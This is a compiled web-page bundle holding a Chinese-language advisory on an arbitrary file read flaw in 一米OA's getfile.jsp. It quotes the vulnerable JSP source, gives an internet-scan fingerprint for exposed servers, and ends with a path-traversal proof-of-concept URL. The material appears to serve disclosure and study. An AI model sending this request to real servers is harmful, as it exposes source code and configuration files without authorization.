import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as t}from"./app-58e4a7d6.js";const a={},l=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>一米OA getfile.jsp文件过滤不足，导致任意文件读取漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>一米OA
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;一米OA&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>产品页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201323308.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>出现漏洞的文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;%@ page contentType=&quot;text/html;charset=utf-8&quot; %&gt;
&lt;%@page import=&quot;cn.js.fan.util.*&quot; %&gt;
&lt;%@page import=&quot;cn.js.fan.web.Global&quot; %&gt;
&lt;%@page import=&quot;com.redmoon.oa.*&quot; %&gt;
&lt;%@page import=&quot;java.io.*&quot; %&gt;
&lt;jsp:useBean id=&quot;fchar&quot; scope=&quot;page&quot; class=&quot;cn.js.fan.util.StrUtil&quot;/&gt;
&lt;jsp:useBean id=&quot;fsecurity&quot; scope=&quot;page&quot; class=&quot;cn.js.fan.security.SecurityUtil&quot;/&gt;
&lt;jsp:useBean id=&quot;privilege&quot; scope=&quot;page&quot; class=&quot;com.redmoon.oa.pvg.Privilege&quot;/&gt;
&lt;%
    String user = ParamUtil.get(request, &quot;user&quot;);
    if (&quot;&quot;.equals(user)) {
        if (!privilege.isUserPrivValid(request, &quot;read&quot;)) {
            System.out.println(&quot;警告非法用户，你无访问此页的权限！&quot;);
            return;
        }
    }

    String filename = ParamUtil.get(request, &quot;filename&quot;);
    String extname = request.getParameter(&quot;extname&quot;);
    String prop = request.getParameter(&quot;prop&quot;);
    if (filename == null) {
        System.out.println(&quot;缺少文件名！&quot;);
        return;
    }

    filename = filename + &quot;.&quot; + extname;

    Config cfg = new Config();
    String noticefilepath;
    if (&quot;activex&quot;.equals(prop)) {
        noticefilepath = prop;
    } else {
        noticefilepath = cfg.get(prop);
    }

    String filePath = Global.getRealPath() + &quot;/&quot; + noticefilepath + &quot;/&quot; + filename;
    if (&quot;li&quot;.equals(prop)) {
        filePath = Global.getRealPath() + &quot;WEB-INF/&quot; + prop + filename;
    }

    response.setContentType(&quot;application/&quot; + extname);
    response.setHeader(&quot;Content-disposition&quot;, &quot;attachment; filename=&quot; + filename);

    BufferedInputStream bis = null;
    BufferedOutputStream bos = null;

    try {
        bis = new BufferedInputStream(new FileInputStream(filePath));
        bos = new BufferedOutputStream(response.getOutputStream());

        byte[] buff = new byte[2048];
        int bytesRead;

        while (-1 != (bytesRead = bis.read(buff, 0, buff.length))) {
            bos.write(buff, 0, bytesRead);
        }

    } catch (final IOException e) {
        System.out.println(&quot;出现IOException.&quot; + e);
    } finally {
        if (bis != null)
            bis.close();
        if (bos != null)
            bos.close();
    }

    out.clear();
    out = pageContext.pushBody();
%&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>首先验证 user 传参是否为空, 需要对 user 参数任意赋值</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>if (&quot;&quot;.equals(user)) {
        if (!privilege.isUserPrivValid(request, &quot;read&quot;)) {
            System.out.println(&quot;警告非法用户，你无访问此页的权限！&quot;);
            return;
        }
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>接着接受3个参数 <code>filename, extname, prop</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>String filename = ParamUtil.get(request, &quot;filename&quot;);
String extname = request.getParameter(&quot;extname&quot;);
String prop = request.getParameter(&quot;prop&quot;);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>接着判断 prop 是否为 activex, 不等于则会去调用系统默认配置的路径 所以filename和extname这两个参数我们可以控制。构造请求前台任意文件读取</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>String filePath = Global.getRealPath() + &quot;/&quot; + noticefilepath + &quot;/&quot; + filename;
    if (&quot;li&quot;.equals(prop)) {
        filePath = Global.getRealPath() + &quot;WEB-INF/&quot; + prop + filename;
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/public/getfile.jsp?user=1&amp;prop=activex&amp;filename=../public/getfile&amp;extname=jsp 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201323352.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,20),s=[l];function d(u,r){return i(),n("div",null,s)}const c=e(a,[["render",d],["__file","一米OA getfile.jsp 任意文件读取漏洞.html.vue"]]);export{c as default};
